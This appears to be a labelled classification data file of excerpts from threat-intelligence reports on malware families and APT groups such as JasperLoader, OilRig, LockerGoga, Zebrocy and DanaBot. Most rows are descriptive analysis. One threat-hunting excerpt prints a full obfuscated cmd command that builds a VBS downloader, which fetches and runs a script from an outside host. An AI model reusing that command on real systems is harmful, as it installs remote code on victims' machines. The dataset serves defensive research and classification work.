1280,Long_Train,"several obfuscation techniques that make analysis more difficult. It appears that this loader was designed with resiliency and flexibility in mind, as evidenced in later stages of the infection process. Over the past several months, we've seen several spam campaigns with signed emails attempting to infect victims with JasperLoader and ultimately the Gootkit banking trojan. Message signing makes use of certificates' verification to confirm the authenticity of the person sending the email, as only those with access to the private keys should be able to sign the message. Message signing is not the same as message encryption and is used only to validate the identity of the message sender not to guarantee the confidentiality of the message itself. Talos has identified several malicious campaigns making use of this type of message signing as a way to lend credibility to their messages and maximize the likelihood that potential victims will open the malicious attachments. Malicious spam campaigns As with many email-based threats, Talos observed multiple distinct campaigns being leveraged to distribute JasperLoader. Each campaign featured various email templates and downloader configurations. Each campaign was also relatively localized and featured multiple languages specific to each of the countries that were being targeted. Most of the campaign activity targeted European countries with a specific focus on Italy. However, we have identified campaigns targeting countries outside of Europe. Below is an example of an email associated with one of the campaigns targeting Germany. Figure 1: Example email (German) The email is fairly basic and includes an attached ZIP archive. The subject line ""Zahlungserinnerung"" roughly translates to ""Payment Reminder,"" which is a theme consistent with many of the malspam campaigns commonly observed in the wild. This particular campaign leveraged a Visual Basic for Applications (VBS) script that was responsible for initiating the JasperLoader infection process. We'll dive into the obfuscated script later. The campaigns targeting Germany were some of the only ones that were observed using VBS files to initiate the JasperLoader infection. Most of the attacks generally used DOCM files to download JasperLoader, and ultimately Gootkit. As previously mentioned, most of the JasperLoader campaign activity that has been observed over the past few months has been targeting Italy. As can be seen in the screenshot below, these emails are significantly different than those seen in the other campaigns. Rather than containing a malicious file attachment, these emails purport that they are notifications",1

Examples of such tools include multiple download/execute tools and RATs in C# and Python, SSH Python script, multiple Python tools for extraction of credentials, history and more. This report details a collection of tools used by this threat actor on its targets after initial infection. It also details deceptive techniques used to divert investigations once attack tools have been deployed inside victim systems (such as Chinese strings, Russian strings and impersonation of the “RXR Saudi Arabia” hacking group).

Several media outlets and other researchers have since performed their own evaluation, and in our assessment, we found the artifacts contained in data dump are indeed consistent with known OilRig operations and toolsets. In addition, the data dump allowed us to retroactively compare our previous research with OilRig’s operational data. This allowed us to fill in previously existing gaps of OilRig’s attack life cycle in addition to validating the accuracy of our research. By analyzing the data dump, we have been able to identify exactly how the BONDUPDATER backdoor and its server component functions, the appearance and functionality of several webshells in deployment by OilRig, each of these tools’ internal operational names, and a better understanding of how widespread the OilRig operations may actually be from a global perspective. The organizations possibly under attack by OilRig is widely-spread across the spectrum of industry verticals, spanning from government, media, energy, transportation and logistics, and technology service providers. In total we identified nearly 13,000 stolen credentials, over 100 deployed webshells, and roughly a dozen backdoor sessions into compromised hosts across 27 countries, 97 organizations, and 18 industries. The information contained in this data dump include: Stolen credentials Potential systems to login to using stolen credentials Deployed webshell URLs Backdoor tools Command and control server component of backdoor tools Scripts to perform DNS hijacking Documents identifying specific individual operators Screenshots of OilRig operational systems The Leak In mid-March 2019, an unknown entity appeared on several hacking forums and Twitter with the user handle @ Mr_L4nnist3r claiming they had access to data dumps involving internal tools and data used by the OilRig group. The initial claim included several screenshots of systems potentially in use by OilRig operators for attacks, a script that appeared to be used for DNS hijacking, and a password protected archive with the filename Glimpse.rar purporting to contain the command and control server panel for an OilRig backdoor. Soon after, a Twitter account with the user handle @dookhtegan appeared claiming they also had access to data dumps involving internal tools and data used by the OilRig group, as seen in Figure 1 . This account used an image from 2004 of a high-profile Iranian asylum seeker named Mehdy Kavousi who famously sewed his eyes and mouth shut to signify that rejecting his asylum claim and sending him back to Iran would be akin to putting him to death. It is unknown why this specific image was chosen, other than perhaps as a symbol of protest. Since the initial account creation, a stylized version of the original has been substituted as the profile image, making it far more difficult to understand who the original individual was. Figure 1.

We will describe how this new ransomware works and detail how enterprises can protect themselves from this threat. Technical analysis LockerGoga is a ransomware that exhibits some interesting behaviors we want to highlight. Based on our research, and compared with other families, it has a few unique functions and capabilities that are rare compared to other ransomware families that have similar objectives and/or targeted sectors in their campaigns. In order to uncover its capabilities, we analyzed all the samples we found, discovering similarities between them, as well as how the development lifecycle adds or modifies different features in the code to evolve the ransomware in a more professional tool used by the group behind it. One of the main differences between LockerGoga and other ransomware families is the ability to spawn different processes in order to accelerate the file encryption in the system: Like other types of malware, LockerGoga will use all the available CPU resources in the system, as we discovered on our machines: Most of the LockerGoga samples work the same way but we observed how they added and removed certain types of functionality during their development lifecycle. The ransomware needs be executed from a privileged account. LockerGoga works in a master/slave configuration. The malware begins its infection on an endpoint by installing a copy of itself on the %TEMP% folder. After being copied, it will start a new process with the -m parameter. The master process runs with the -m parameter and is responsible for creating the list of files to encrypt and spawning the slaves. The",0

The findings outlined in this blog should help threat hunting teams identify MuddyWater's latest TTPs. In this latest activity, the threat actor first added an obfuscated Visual Basic for Applications (VBA) script to establish persistence as a registry key.

The researchers attributed the compromise of the diplomatic cables and the targeting of over 100 additional organizations (including foreign and finance ministries, think-tanks and trade unions) to the Chinese government’s Strategic Support Force (SSF), a Chinese military organization, without any explanation as to how they arrived at that attribution assessment. Even more intriguing was the fact that, according to the Times report, Area 1 researchers provided the compromised cables to the newspaper. The Times quoted extensively from the cables – a move that raised eyebrows and prompted interesting legal and ethical questions for both Area 1 and the Times. But legal and ethical questions aside, there was yet another reason why we took notice of this report. Included in the Area 1 “indicators of compromise” (IoCs) was a single website/domain name they said the Chinese SSF used for Command-and-Control (C2) in both targeted attacks. As we will demonstrate in greater detail below, we connected this domain to a host of other, disparate Chinese APT groups whose tasking, targeting, and toolsets have been literally all over the map. We also found evidence suggesting that different Chinese APT groups have also been using the same malware - and in some cases, the same exploit builder.

FireEye's Managed Defense has responded to and contained numerous intrusions that we assess are related. The actor is leveraging publicly available tools in early phases of the intrusion; however, we have observed them transition to custom implants in later stage activity in an attempt to circumvent our detection. On Sept. 20, 2017, FireEye Intelligence published a blog post detailing spear phishing activity targeting Energy and Aerospace industries . Recent public reporting indicated possible links between the confirmed APT33 spear phishing and destructive SHAMOON attacks ; however, we were unable to independently verify this claim. FireEye’s Advanced Practices team leverages telemetry and aggressive proactive operations to maintain visibility of APT33 and their attempted intrusions against our customers. These efforts enabled us to establish an operational timeline that was consistent with multiple intrusions Managed Defense identified and contained prior to the actor completing their mission. We correlated the intrusions using an internally-developed similarity engine described below. Additionally, public discussions have also indicated that specific attacker infrastructure we observed is possibly related to the recent destructive SHAMOON attacks. 45 days ago, during 24x7 monitoring, #ManagedDefense detected & contained an attempted intrusion from newly-identified adversary infrastructure*.

Between May and June 2018, Unit 42 observed multiple attacks by the OilRig group appearing to originate from a government agency in the Middle East. Based on previously observed tactics, it is highly likely the OilRig group leveraged credential harvesting and compromised accounts to use the government agency as a launching platform for their true attacks. The targets in these attacks included a technology services provider as well as another government entity. Both these targets were in the same nation-state. Further, the attacks against these targets were made to appear to have originated from other entities in the same country. However, the actual attackers themselves were outside this country and likely used stolen credentials from the intermediary organization to carry out their attacks. The attacks delivered a PowerShell backdoor called QUADAGENT, a tool attributed to the OilRig group by both ClearSky Cyber Security and FireEye. In our own analysis, we were able to also confirm the attribution of this tool to the OilRig group by examining specific artifacts that were reused from tools previously used by the OilRig group in addition to tactics reused from previous attacks as well. The use of script-based backdoors is a common technique used by the OilRig group as we have previously documented. However, packaging these scripts into a portable executable (PE) file is not a tactic we have seen the OilRig group use frequently. Detailed analysis of QUADAGENT and its ties to Oilrig is the appendix at the end of this blog. QUADAGENT is the 12 th custom built tool that Unit 42 has documented the OilRig group using for their attacks.

This is one of the easy tricks to check if the malware is not infected users from specific countries. As explained in the MSDN, A ""locale"" is a collection of language-related user preference information represented as a list of values, the stealer will check if the language is corresponding with the list of countries that mentioned below.

While we cannot be certain the impetus for this, we believe the threat group uses multiple languages to create their Trojans to make them differ structurally and visually to make detection more difficult. We have seen two separate attacks deliver the Go variant of Zebrocy. The first attack occurred on October 11 and relied on a spear-phishing email with an LNK shortcut attachment. The LNK shortcut is meant to run a series of PowerShell scripts to extract a payload from the shortcut to install and execute; however, the PowerShell scripts were coded incorrectly and could not install or run the payload as delivered. Therefore, the first observed attack mentioned in this blog could not be successful, but the tactics, techniques and indicators are worth discussing for situational awareness.

When our Threat Hunting team observed the following command attempting to execute through one of the processes on one computer, alarms were raised: c md /v:on /c for /f “tokens=2 delims=.[” %i in (‘ver’) do (set a=%i)&if !a:~-1!==5 (@echo on error resume next>%windir%\11.vbs&@echo Set ox=CreateObject^(“MSXML2.XMLHTTP”^)>>%windir%\11.vbs&@echo ox.open “GET”,” http://stafftest.firewall-gateway.com:8000/info.vbs “,false>>%windir%\11.vbs&@echo ox.setRequestHeader “User-Agent”, “-“>>%windir%\11.vbs&@echo ox.send^(^)>>%windir%\11.vbs&@echo If ox.Status=200 Then>>%windir%\11.vbs&@echo Set oas=CreateObject^(“ADODB.Stream”^)>>%windir%\11.vbs&@echo oas.Open>>%windir%\11.vbs&@echo oas.Type=1 >>%windir%\11.vbs&@echo oas.Write ox.ResponseBody>>%windir%\11.vbs&@echo oas.SaveToFile “%windir%\info.vbs”,2 >>%windir%\11.vbs&@echo oas.Close>>%windir%\11.vbs&@echo End if>>%windir%\11.vbs&@echo Set os=CreateObject^(“WScript.Shell”^)>>%windir%\11.vbs&@echo os.Exec^(“cscript.exe %windir%\info.vbs”^)>>%windir%\11.vbs&cscript.exe %windir%\11.vbs) else (powershell -NoP",0

As soon as the client contacted us, we started conducting a full investigation into the infected machine, including memory dumps, event logs, environment indicators from the network and so on and so forth. Finding very little information about this tool, we decided that seeing as how we’d already dived into the stealer, we might as well share some of our main findings in case other incidents occur in the future. The purpose of this blogpost is to enumerate the Predator stealer’s versions, technical features, indicators and Yara rule signatures, to help monitor and detect new samples, and to provide general information about its owners’ activities. As well as all the information we collected from the client, we went the extra mile and contacted a source who had previously analyzed Predator.

The attackers rely heavily on Microsoft technologies on both the client and server sides: the Trojan uses standard Windows utilities like Microsoft Background Intelligent Transfer Service (BITS) bitsadmin.exe to receive commands and exfiltrate data. Its C2 is based on IIS using .asp technology to handle the victims’ HTTP requests. Remexi developers use the C programming language and GCC compiler on Windows in the MinGW environment. They most likely used the Qt Creator IDE in a Windows environment. The malware utilizes several persistence mechanisms including scheduled tasks, Userinit and Run registry keys in the HKLM hive. XOR and RC4 encryption is used with quite long unique keys for different samples. Among all these random keys once the word “salamati” was also used, which means “health” in Farsi.

We named this malware Farseer malware due to a string found in the PDB path embedded within the executable files. For example: e:\WorkSpace\A1\coding\ Farseer \RemoteShellsRemote\Release\RemoteShellsRemote.pdb. Tracking-back, we’ve seen over 30 unique samples throughout the past two and half years, with the majority in 2017 and a handful in 2018, the most recent of which were seen, at least from our visibility, during the last two months indicating a relatively low-volume yet steady flow of Farseer samples. Figure 1 below shows the trend of malicious sessions for these samples according to AutoFocus. Figure 1 AutoFocus session trends for Farseer samples over time Ties to HenBox Android Malware et al As previously mentioned, there are ties between Farseer, HenBox, PlugX, Zupdax, 9002, and Poison Ivy malware families.

We can safely surmise that it is very likely that this threat was specifically targeting this organization at this time for reasons unknown to us. The threat being delivered is known as DanaBot. It is a modular banking Trojan that has been historically linked to combining operations with other malware operators, such as those behind Gootkit. Other modules associated with DanaBot include remote desktop through VNC, information stealing, and keylogging.

There is also evidence that it attempted to attack a major international travel reservations firm.

Chafer has been active since at least July 2014 and its activities were first exposed by Symantec in December 2015 , when it was found to be conducting targeted surveillance of domestic and international targets. At the time, many of its targets were individuals located in Iran, and it had already begun compromising telecom providers as well as airline companies in the Middle East region.

This file, which is a downloader, then downloads and runs the second executable file containing a backdoor. The first stage downloader also checks for the existence of different kinds of antivirus software processes, and then proceeds to exit if any is found. At the time of discovery, the backdoor was seemingly unknown to AV products.
